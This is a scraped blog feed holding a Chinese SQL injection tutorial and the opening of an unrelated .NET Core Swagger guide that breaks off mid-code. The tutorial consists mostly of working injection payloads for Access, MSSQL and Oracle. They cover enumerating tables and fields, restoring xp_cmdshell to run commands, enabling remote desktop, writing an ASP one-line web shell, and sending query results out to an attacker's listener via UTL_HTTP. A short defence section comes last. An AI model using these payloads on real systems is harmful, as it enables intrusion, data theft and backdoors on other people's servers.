&lt;p&gt;最常用的SQL注入判断方法，在网站中寻找如下形式的网页&lt;br/&gt; 　　www.chinaliancheng.com/*.asp?id=1&lt;br/&gt;　　 www.chinaliancheng.com/*.aspx?id=1&lt;br/&gt;　　 www.chinaliancheng.com/*.php?id=1&lt;br/&gt; 　　www.chinaliancheng.com/*.jsp?id=1&lt;br/&gt;单引号法&lt;br/&gt; 　　提交单引号，面返回错误&lt;br/&gt; 　　and 1=1 and 1=2&lt;br/&gt;　　提交and 1=1 页面返回正常 ，提交and 1=2 页面返回错误&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.3确认注入点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;区分数字和字符串&lt;br/&gt;　　 数字型&lt;br/&gt;　　 SELECT *FROM user WHERE id=1&lt;br/&gt;　　 SELECT * FROM user WHERE id &amp;gt; 1&lt;br/&gt;　　 带引号类型的&lt;br/&gt;　　 SELECT * FROM user WHERE name = ‘admin’&lt;br/&gt;　　 SELECT * FROM user WHERE date &amp;gt; ‘2017-5-3’&lt;/p&gt;
&lt;p&gt;内联SQL注入：内联注入是指插入查询注入SQL代码后，原来的查询仍然会全部执行。&lt;/p&gt;
&lt;p&gt;终止式SQL注入：终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句&lt;em id=&quot;__mceDel&quot;&gt;。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3：识别数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222203026057-984005676.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222203048080-16992243.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.1：数据库连接运算符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222203150123-1535958272.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;www.xx.com/news.php?uid=admin&lt;br/&gt;www.xx.com/news.php?uid=ad’+’min&lt;br/&gt;www.xx.com/news.php?uid=ad’’min&lt;br/&gt;www.xx.com/news.php?uid=ad||min&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3.2 Access数据库注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;利用内置数据库表获取数据库类型&lt;/p&gt;
&lt;p&gt;and (select count(*) from sysobjects)&amp;gt;=0&lt;br/&gt;　　Sysobjects为Mssql数据库内置表&lt;br/&gt;and (select count(*) from msysobjects)&amp;gt;=0&lt;br/&gt;　　Msysobjects为Access数据库内置表&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Access&lt;/strong&gt;手工注入猜解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;猜表名&lt;br/&gt;　　 and exists(select * from 表名)&lt;br/&gt; 　　and(select count(*) from 表名)&amp;gt;=0&lt;/p&gt;
&lt;p&gt;猜字段名&lt;br/&gt;　　 and exists(select 字段名 from 表名)&lt;br/&gt;　　 and (select count(字段名) from 表名)&amp;gt;=0&lt;br/&gt;猜字段长度&lt;br/&gt;　　 and (select top 1 len(字段名) from 表名)&amp;gt;1&lt;br/&gt;　　 and (select top 1 len(字段名) from 表名)&amp;gt;2&lt;br/&gt;　　 and (select top 1 len(字段名) from 表名)&amp;gt;n&lt;/p&gt;
&lt;p&gt;猜字段值&lt;br/&gt;　　and (select top 1 asc(mid (字段名,1,1)) from 表名)&amp;gt;0&lt;br/&gt;　　and (select top 1 asc(mid (字段名,1,1)) from 表名)&amp;gt;1&lt;br/&gt;　　and (select top 1 asc(mid (字段名,1,1)) from 表名)&amp;gt;n&lt;br/&gt;　　and (select top 1 asc(mid (字段名,2,1)) from 表名)&amp;gt;0&lt;br/&gt;　　and (select top 1 asc(mid (字段名,2,1)) from 表名)&amp;gt;2&lt;br/&gt;　　and (select top 1 asc(mid (字段名,2,1)) from 表名)&amp;gt;n&lt;/p&gt;
&lt;p&gt;Order by 猜字段数目&lt;/p&gt;
&lt;p&gt;　　Order by 1&lt;br/&gt;　　Order by 2&lt;br/&gt;　　Order by n&lt;/p&gt;
&lt;p&gt;Union select 获取段内容&lt;br/&gt;　　Union select 1,字段名，2,…,n from 表名&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;3.3 Mssql数据库注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在进行MsSQL注入攻击时，首先要对MsSQL注入点进行一下基本的注入检查，以确定后面的攻击实施方案。&lt;/p&gt;&lt;p&gt;注入点类型的判断&lt;br/&gt;　　 and exists (select * from sysobjects)&lt;br/&gt;注入点权限判断&lt;br/&gt;　　 and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员&lt;br/&gt;　　 and 1=(select IS_SRVROLEMEMBER('db_owner')) //判断是否是库权限&lt;br/&gt;　　 and 1=(select IS_SRVROLEMEMBER('public')) //判断是否为public权限&lt;/p&gt;
&lt;p&gt;返回信息判断&lt;br/&gt;　　 and @@version&amp;gt;0 //数据库信息&lt;br/&gt;　　 ;declare @d int //判断MsSQL支持多行语句查询&lt;br/&gt;　　 and (select count(1) from [sysobjects])&amp;gt;=0 //是否支持子查询&lt;br/&gt;　　 and user&amp;gt;0 //获取当前数据库用户名&lt;br/&gt;　　 and 1=convert(int,db_name()) 或 1=(select db_name()) //当前数据库名&lt;br/&gt;　　 and 1=(select @@servername) //本地服务名&lt;br/&gt;　　 and 1=(select HAS_DBACCESS('master')) //判断是否有库读取权限&lt;/p&gt;
&lt;p&gt;检查扩展存储&lt;br/&gt;　　 检查xp_cmdshell扩展存储&lt;br/&gt;　　 and 1=(select count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name = 'xp_cmdshell')&lt;br/&gt;　　 检查xp_regread扩展存储&lt;br/&gt;　　 and 1=(select count(*) FROM master.dbo.sysobjects where name = 'xp_regread')&lt;/p&gt;
&lt;p&gt;恢复扩展存储&lt;br/&gt;　　 删除xp_cmdshell&lt;br/&gt;　　 exec master..sp_dropextendedproc'xp_cmdshell'&lt;br/&gt;　　 创建xp_cmdshell&lt;br/&gt;　　 exec master..sp_addextendedprocxp_cmdshell,'xplog70.dll‘&lt;br/&gt;　　 该语句利用系统中默认的“xplog70.dll”文件，自动恢复xp_cmdshell。&lt;br/&gt;　　 如果xplog70.dll被删除或改名，可以自定义路径进行恢复:&lt;br/&gt;　　 exec master..sp_addextendedproc'xp_cmdshell','c:\xplog70.dll'&lt;/p&gt;
&lt;p&gt;Sa权限下扩展存储攻击利用方法&lt;br/&gt;　　 Xp_cmdshell扩展执行任意命令&lt;br/&gt;　　 执行任意命令&lt;br/&gt;　　 ;exec master..xp_cmdshell 'dir c:\‘&lt;br/&gt;　　 开启3389&lt;br/&gt;　　  exec master..xp_cmdshell 'sc config termservice start=auto‘&lt;br/&gt;　　  exec master..xp_cmdshell 'net start termservice'&lt;br/&gt;　　  exec master..xp_cmdshell 'reg add&lt;br/&gt;&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v&lt;br/&gt;fDenyTSConnections /t REG_DWORD /d 0x0 /f'&lt;/p&gt;
&lt;p&gt;利用sp_makewebtash写入一句话木马&lt;br/&gt;　　 exec sp_makewebtask&lt;br/&gt;'c:\inetpub\wwwroot\c.asp','select''%3C%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%&lt;br/&gt;63%68%6F%70%70%65%72%22%29%25%3E'''&lt;/p&gt;
&lt;p&gt;Dbowner权限下的扩展攻击利用&lt;br/&gt;　　 判断数据库用户权限&lt;br/&gt;　　 and 1=(select is_member('db_owner'));&lt;br/&gt;　　 搜索Web目录&lt;br/&gt;　　 创建一个临时表&lt;br/&gt;　　 create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULLIDENTITY(1,1));&lt;br/&gt;　　 利用xp_dirtree扩展查询&lt;br/&gt;　　 insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1&lt;br/&gt;　　 查询表中的内容&lt;br/&gt;　　 and(select dir from temp where id=1)&amp;gt;0&lt;/p&gt;
&lt;p&gt;查询暴库的另一种方法&lt;br/&gt;　　 暴字段名和字段值&lt;br/&gt;　　 增加数字n的值，就可以得到表中所有字段&lt;br/&gt;　　 and (select col_name(object_id(‘表名'),n))=0&lt;br/&gt;　　 获取字段内容&lt;br/&gt;　　 and (select top 1 字段名 from 表名)&amp;gt;0&lt;br/&gt;　　 爆其他字段值&lt;br/&gt;　　 and (select top 1 字段名 from 表名 where 字段名&amp;lt;&amp;gt;字段值1)&amp;gt;0&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;3.4 Oracle数据库注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Oracle注入点判断&lt;br/&gt;　　 and 1=1 and 1=2&lt;br/&gt;　　 /*&lt;br/&gt;　　 --&lt;br/&gt;　　 ;&lt;br/&gt;　　 and exists(select * from dual)&lt;br/&gt;　　 and exists(select count(*) from user_tables)&amp;gt;0&lt;/p&gt;
&lt;p&gt;注入点信息判断&lt;br/&gt;　　 确定注入点类型后，与前面的MySQL注入一样，先用order by 猜出字段数目，再用联合查询union select方法获取想要的信息。&lt;br/&gt;获取数据库版本信息&lt;br/&gt;　　 and 1=2 union select null,null,(select banner from sys.v_$version where rownum=1) from dual&lt;br/&gt;获取当前数据库连接用户名&lt;br/&gt;　　 and 1=2 union select null,null,(select SYS_CONTEXT ('USERENV','CURRENT_USER') fromdual) from dual&lt;br/&gt;获取系统平台&lt;br/&gt;　　 and 1=2 union select null,null,(select member from v$logfile where rownum=1) from dual&lt;br/&gt;获取服务器SID&lt;br/&gt;　　 and 1=2 union select null,null,(select instance_namefrom v$instance) from dual&lt;/p&gt;
&lt;p&gt;爆库名&lt;br/&gt;　　 and 1=2 union select null,null,(select owner from all_tables where rownum=1) from dual&lt;br/&gt;爆出第一个库名后可以使用如下语句，继续爆其他库名&lt;br/&gt;　　 and 1=2 union select null,null,(select owner from all_table where rownum=1 and owner&amp;lt;&amp;gt;'第一个库名') from dual&lt;br/&gt;获取表名&lt;br/&gt;　　 and 1=2 union select null,null,(select table_name from user_tables where rownum=1) from dual&lt;br/&gt;爆其他表名&lt;br/&gt;　　 and 1=2 union select null,null,(select table_name from user_tables where rownum=1 and table_name&amp;lt;&amp;gt;'第一个表名') from dual&lt;br/&gt;注意:表名要用大写或大写的十六进制代码。&lt;/p&gt;
&lt;p&gt;获取字段名&lt;br/&gt;　　and 1=2 union select null,null,(select column_name from user_tab_columns where table_name='表名' and rownum=1) from dual&lt;br/&gt;获取其他字段名&lt;br/&gt;　　 and 1=2 union select null,null,(select column_name from user_tab_columns where table_name='表名' and column_name&amp;lt;&amp;gt;'第一个字段' and rownum=1) from dual&lt;br/&gt; 获取字段内容&lt;br/&gt;　　 and 1=2 union select null,null,字段名 from 表名&lt;/p&gt;
&lt;p&gt;判断UTL_HTTP存储过程是否可用&lt;br/&gt;　　 and exists(select count(*) from all_objectswhere object_name='UTL_HTTP')&lt;br/&gt;监听本地端口&lt;br/&gt;　　 nc –vv –l –p 8888&lt;br/&gt;　　 UTL_HTTP反弹注入&lt;br/&gt;　　 and UTL_HTTP.request('http://IP:端口号/'||(查询语句))=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222205122250-1339888040.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4 注入工具介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222205202249-560614118.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5 防御sql注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222205233240-542606079.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 使用参数化查询&lt;/p&gt;
&lt;p&gt;PHP包含很多用于访问数据库的框架。访问MySQL数据库的mysqli包，PEAR::MDB2包(它替代了流行的PEAR::DB包)以及新的PHP数据对象(PDO)框架，他们均为使用参数化语句提供便利。&lt;/p&gt;
&lt;p&gt;输入验证&lt;/p&gt;
&lt;p&gt;验证应用接收到的输入时一种可用的功能强大的控制手段(如果用的好的话)。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;白名单&lt;br/&gt;　　 使用白名单应该开了下列要点:&lt;br/&gt;　　 数据类型:字符、数字等；&lt;br/&gt;　　 数据大小:字符串长度是否正确，数字的大小和精度是否正确。&lt;br/&gt;　　 数据范围:如果 是数字型，是否位于该数据类型期望的数字范围。&lt;br/&gt;　　 数据内容:数据是否属于期望的数据类型，如手机号码，它是否瞒住期望的值。&lt;br/&gt;黑名单&lt;br/&gt;　　 黑名单验证的常用方法也是使用正则表达式。&lt;/p&gt;

&lt;p&gt;编码输入与使用存储过程防御&lt;/p&gt;
&lt;p&gt;除了验证应用受到的输入以外，通常还需要对在应用的不同模块或部分传递的内容进行编码。&lt;/p&gt;
&lt;p&gt;通常会被忽视的情况是对来自数据库的信息进行编码，尤其是当正在使用的数据库未经过严格验证或审查，或者来自第三方数据源时。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;将应用设计成专门使用存储过程来访问数据库是一种可以放置或减轻SQL注入影响的技术。存储&lt;br/&gt;过程是保存在数据库汇总的程序。根据数据库的不同，可以使用很多不同语言及其变体来编写存储过程&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 13:01:00 +0000</pubDate>
<dc:creator>飞天小子</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Zfc-Cjk/p/8460101.html</dc:identifier>
</item>
<item>
<title>.NET Core使用swagger进行API接口文档管理 - OMango</title>
<link>http://www.cnblogs.com/OMango/p/8460092.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/OMango/p/8460092.html</guid>
<description>&lt;p&gt;&lt;strong&gt;一、问题背景&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　随着技术的发展，现在的开发模式已经更多的转向了前后端分离的模式，在前后端开发的过程中，联系的方式也变成了API接口，但是目前项目中对于API的管理很多时候还是通过手工编写文档，每次的需求变更只要涉及到接口的变更，文档都需要进行额外的维护，如果有哪个小伙伴忘记维护，很多时候就会造成一连续的问题，那如何可以更方便的解决API的沟通问题？Swagger给我们提供了一个方式，由于目前主要我是投入在.NET Core项目的开发中，所以以.NET Core作为示例&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、什么是Swagger&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Swagger可以从不同的代码中，根据注释生成API信息，swagger拥有强大的社区，并且对于各种语言都支持良好，有很多的工具可以通过swagger生成的文件生成API文档&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三、.NET Core中使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　.NET Core中使用首先要用nuget引用&lt;a href=&quot;https://github.com/domaindrivendev/Swashbuckle.AspNetCore&quot; target=&quot;_blank&quot;&gt;Swashbuckle.AspNetCore&lt;/a&gt;，在startup.cs中加入如下代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; This method gets called by the runtime. Use this method to add services to the container.&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {
            services.AddMvc();
            services.AddSwaggerGen(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                c.SwaggerDoc(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Info { Title = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, Version = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; basePath =&lt;span&gt; PlatformServices.Default.Application.ApplicationBasePath;
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; xmlPath = Path.Combine(basePath, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WebApplication2.xml&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                c.IncludeXmlComments(xmlPath);
            });
            services.AddMvcCore().AddApiExplorer();
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This method gets called by the runtime. Use this method to configure the HTTP request pipeline.&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (env.IsDevelopment())
            {
                app.UseDeveloperExceptionPage();
            }

            app.UseMvcWithDefaultRoute();
            app.UseSwagger(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
            });
            app.UseSwaggerUI(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                c.ShowExtensions();
                c.ValidatorUrl(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
                c.SwaggerEndpoint(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/swagger/v1/swagger.json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test V1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            });
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　以上部分为加载swagger的代码，位于startup.cs中，下面是controller代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections.Generic;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Linq;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Threading.Tasks;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.AspNetCore.Mvc;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; WebApplication2.Controllers
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 测试信息
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    [Route(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;api/[controller]/[action]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ValuesController : Controller
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 获取所有信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
&lt;span&gt;        [HttpGet]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt; Get()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;[] { &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;value1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;value2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; };
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 根据ID获取信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; GET api/values/5&lt;/span&gt;
        [HttpGet(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Get(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; POST了一个数据信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;value&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; POST api/values&lt;/span&gt;
&lt;span&gt;        [HttpPost]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Post([FromBody]&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value)
        {
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 根据ID put 数据
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;value&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; PUT api/values/5&lt;/span&gt;
        [HttpPut(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Put(&lt;span&gt;int&lt;/span&gt; id, [FromBody]&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value)
        {
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 根据ID删除数据
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; DELETE api/values/5&lt;/span&gt;
        [HttpDelete(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{id}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Delete(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id)
        {
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 复杂数据操作
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;id&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; DELETE api/values/5&lt;/span&gt;
&lt;span&gt;        [HttpPost]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; namevalue test(namevalue _info)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; _info;
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; namevalue
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; name的信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; String name { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; value的信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; String value { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　接下来我们还需要在生成中勾上XML生成文档，如图所示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222203108082-1289478738.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　接下去我们可以运行起来了，调试，浏览器中输入http://localhost:50510/swagger/，这里端口啥的根据实际情况来，运行效果如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/465472/201802/465472-20180222203310229-1864588700.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到swagger将方法上的注释以及实体的注释都抓出来了，并且显示在swaggerui，整体一目了然，并且可以通过try it按钮进行简单的调试，但是在具体项目中，可能存在需要将某些客户端信息通过header带到服务中，例如token信息，用户信息等（我们项目中就需要header中带上token传递到后端），那针对于这种情况要如何实现呢？可以看下面的做法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This method gets called by the runtime. Use this method to add services to the container.&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {
            services.AddMvc();
            services.AddSwaggerGen(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                c.SwaggerDoc(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Info { Title = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, Version = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; basePath =&lt;span&gt; PlatformServices.Default.Application.ApplicationBasePath;
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; xmlPath = Path.Combine(basePath, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WebApplication2.xml&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                c.IncludeXmlComments(xmlPath);
